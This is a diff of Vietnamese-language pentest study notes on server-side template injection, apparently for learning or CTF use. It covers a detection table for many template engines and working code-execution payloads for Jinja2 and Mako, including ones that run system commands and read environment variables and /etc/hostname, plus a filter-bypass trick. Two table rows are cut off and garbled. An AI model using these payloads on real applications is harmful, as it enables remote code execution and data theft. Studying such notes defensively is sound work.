@@ -18,24 +18,24 @@ ${7*7}
 {{ 7 | times: 7 }}     # Liquid
 ```
 
-|Nền tảng|Engine|Payload phát hiện (kỳ vọng 49 hoặc dấu hiệu)|
-|---|---|---|
-|Python|**Jinja2**|`{{7*7}}` → `49` ; `{{cycler.__mro__}}` báo lỗi/đối tượng|
-|Python|**Django TPL**|`{{7|
-|Python|**Mako**|`${7*7}` → `49`|
-|Python|**Tornado**|`{{7*7}}` → `49`|
-|PHP|**Twig**|`{{7*7}}` → `49` ; `{{_self}}` hiển thị template ref|
-|PHP|**Smarty**|`{7*7}` → `49` ; `{$smarty.now}` hiển thị thời gian|
-|PHP|**Blade (Laravel)**|`{{ 7*7 }}` thường **escaped** (hiện `49`), nhưng logic khác với Twig|
-|Ruby|**ERB**|`<%= 7*7 %>` → `49`|
-|Ruby|**Liquid**|`{{ 7|
-|Java|**Freemarker**|`${7*7}` → `49` ; `${.main}`/`${.vars}` đôi khi leak|
-|Java|**Thymeleaf/SpEL**|`${7*7}` hoặc `*{7*7}` → `49`|
-|Java|**Velocity**|`#set($x=7*7) $x` → `49`|
-|Node|**Nunjucks**|`{{7*7}}` → `49`|
-|Node|**EJS**|`<%= 7*7 %>` → `49`|
-|Node|**Pug/Jade**|`#{7*7}` → `49`|
-|Go|**html/template**|Không có toán học trực tiếp; thử `{{.}}` hoặc cố tình lỗi để lộ stack|
+| Nền tảng | Engine              | Payload phát hiện (kỳ vọng 49 hoặc dấu hiệu)                          |
+| -------- | ------------------- | --------------------------------------------------------------------- |
+| Python   | **Jinja2**          | `{{7*7}}` → `49` ; `{{cycler.__mro__}}` báo lỗi/đối tượng             |
+| Python   | **Django TPL**      | `{{7                                                                  |
+| Python   | **Mako**            | `${7*7}` → `49`                                                       |
+| Python   | **Tornado**         | `{{7*7}}` → `49`                                                      |
+| PHP      | **Twig**            | `{{7*7}}` → `49` ; `{{_self}}` hiển thị template ref                  |
+| PHP      | **Smarty**          | `{7*7}` → `49` ; `{$smarty.now}` hiển thị thời gian                   |
+| PHP      | **Blade (Laravel)** | `{{ 7*7 }}` thường **escaped** (hiện `49`), nhưng logic khác với Twig |
+| Ruby     | **ERB**             | `<%= 7*7 %>` → `49`                                                   |
+| Ruby     | **Liquid**          | `{{ 7                                                                 |
+| Java     | **Freemarker**      | `${7*7}` → `49` ; `${.main}`/`${.vars}` đôi khi leak                  |
+| Java     | **Thymeleaf/SpEL**  | `${7*7}` hoặc `*{7*7}` → `49`                                         |
+| Java     | **Velocity**        | `#set($x=7*7) $x` → `49`                                              |
+| Node     | **Nunjucks**        | `{{7*7}}` → `49`                                                      |
+| Node     | **EJS**             | `<%= 7*7 %>` → `49`                                                   |
+| Node     | **Pug/Jade**        | `#{7*7}` → `49`                                                       |
+| Go       | **html/template**   | Không có toán học trực tiếp; thử `{{.}}` hoặc cố tình lỗi để lộ stack |
 
 <img width="715" height="452" alt="image" src="https://github.com/user-attachments/assets/c768a800-8c0b-4b2d-9182-30b93738edc8" />
 
@@ -44,21 +44,33 @@ ${7*7}
 - **Lỗi**: thông điệp/stack trace tiết lộ tên package (`jinja2`, `freemarker`, `org.thymeleaf`, `erb`, `twig`).
 - **Dấu escape**: `{{ … }}` hiển thị nguyên văn ⇒ có thể chỉ render text (escape bật) hoặc không dùng engine đó.
 #### Exploit
-- `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`:  
-	- dành cho python (Jinja2)
-	- thay id bằng các câu lệnh hệ thống khác (`ls, cat, ...`)
-	- `request` ở đây là object Flask Request.
-	- `.application` trỏ tới Flask app.
-	- `. __globals__` lấy **global variables** (biến toàn cục) của function/module hiện tại — về cơ bản là dictionary chứa các tham chiếu Python toàn cục.
-	- `.__builtins__` : Truy cập module built-in của Python (nơi chứa các hàm built-in như `print`, `len`, `__import__`, v.v.).
-	- `.__import__('os')`: 
-		- Gọi trực tiếp built-in `__import__` để **import module `os`**.
-		- Kỹ thuật này bỏ qua việc code chặn `import` trong template.
-	- `.popen('id')`: Dùng hàm `os.popen()` để chạy lệnh hệ thống (`id`) và mở một **pipe** để đọc kết quả.
-	- `.read()`
-		- Đọc toàn bộ output từ pipe (kết quả của lệnh `id`).
-		- Lệnh `id` sẽ in ra user, group, quyền hiện tại của process server.
-  #### Key Bypass Techniques
+###### Jinja2 (Python)
+- `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
+- thay id bằng các câu lệnh hệ thống khác (`ls, cat, ...`)
+- `request` ở đây là object Flask Request.
+- `.application` trỏ tới Flask app.
+- `. __globals__` lấy **global variables** (biến toàn cục) của function/module hiện tại — về cơ bản là dictionary chứa các tham chiếu Python toàn cục.
+- `.__builtins__` : Truy cập module built-in của Python (nơi chứa các hàm built-in như `print`, `len`, `__import__`, v.v.).
+- `.__import__('os')`: 
+	- Gọi trực tiếp built-in `__import__` để **import module `os`**.
+	- Kỹ thuật này bỏ qua việc code chặn `import` trong template.
+- `.popen('id')`: Dùng hàm `os.popen()` để chạy lệnh hệ thống (`id`) và mở một **pipe** để đọc kết quả.
+- `.read()`
+	- Đọc toàn bộ output từ pipe (kết quả của lệnh `id`).
+	- Lệnh `id` sẽ in ra user, group, quyền hiện tại của process server.
+###### Mako (Python)
+- `${dir()}`: liệt kê tên biến trong scope hiện tại
+- `${list(locals().keys())}`: các biến local mà Mako truyền vào
+- `${list(globals().keys())}`: (tuỳ) biến global trong module template
+- `${__import__('sys').version}` : phiên bản Python
+- `${__import__('sys').executable}`: đường dẫn python
+- `${__import__('sys').path}`: PYTHONPATH
+- `${__import__('time').sleep(3) or 'OK'}`: phản hồi chậm rõ rệt → thực thi
+- `${getattr(__import__('os'), 'getcwd')()}`: thư mục làm việc
+- `${dict(__import__('os').environ).keys()}` : tên biến môi trường
+- `${open('/etc/hostname').read()}`: file nhỏ, dễ hiển thị
+- `${__import__("os").popen("ls").read()}`: chạy lệnh cmd
+#### Key Bypass Techniques
 ##### 1. Avoiding Dot Notation (`.`) → Uses `|attr()` to dynamically access attributes:
 
 request|attr(‘application’)|attr(“__globals__”)
